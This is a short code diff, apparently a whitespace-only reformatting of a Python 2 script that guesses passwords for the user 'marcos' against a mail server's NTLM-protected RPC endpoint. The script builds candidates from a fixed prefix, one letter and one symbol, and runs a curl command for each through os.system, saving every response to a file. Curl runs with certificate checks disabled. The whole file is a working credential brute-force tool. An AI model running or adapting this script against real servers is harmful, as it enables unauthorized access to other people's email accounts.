@@ -19,14 +19,16 @@
 
 import os
 
-pwdprefix="marcos"
-pwdsmiddle=['a','s','d', 'A','S','D']
-pwdsuffix=['1','!','#']
-cmdprefix="curl -k -v --ntlm -u \"\mail.example.com\marcos:"
-cmdsuffix="\" https://mail.example.com/rpc/"
+
+pwdprefix  = "marcos"
+pwdsmiddle = ['a', 's', 'd', 'A', 'S', 'D']
+pwdsuffix  = ['1', '!', '#']
+cmdprefix  = "curl -k -v --ntlm -u \"\mail.example.com\marcos:"
+cmdsuffix  = "\" https://mail.example.com/rpc/"
+
 
 for s in pwdsuffix:
     for m1 in pwdsmiddle:
-        pwdattempt=pwdprefix+m1+s
-        print cmdprefix+pwdattempt+cmdsuffix+" -o "+pwdattempt+".html"
-        os.system(cmdprefix+pwdattempt+cmdsuffix+" -o "+pwdattempt+".html")
+        pwdattempt = pwdprefix + m1 + s
+        print cmdprefix + pwdattempt + cmdsuffix + " -o " + pwdattempt + ".html"
+        os.system(cmdprefix + pwdattempt + cmdsuffix + " -o " + pwdattempt + ".html")
